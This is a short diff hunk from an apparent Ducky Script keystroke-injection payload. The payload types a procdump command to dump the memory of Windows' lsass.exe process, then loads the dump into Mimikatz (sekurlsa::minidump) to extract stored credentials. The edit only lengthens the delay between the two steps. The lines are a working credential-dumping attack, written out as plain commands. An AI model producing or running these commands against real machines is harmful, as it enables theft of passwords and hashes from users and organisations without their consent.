@@ -25,8 +25,8 @@ STRING D:
 ENTER
 STRING procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ENTER
-REM the time depends of the machine, some take 1 second and some 10, I will choose 5.
-DELAY 5000
+REM the time depends of the machine, some take 10 seconds and some 25, I will choose 17.
+DELAY 17000
 REM Invoke Mimikatz with lsass.dmp and save the results.
 STRING mimikatz # sekurlsa::minidump lsass.dmp
 ENTER
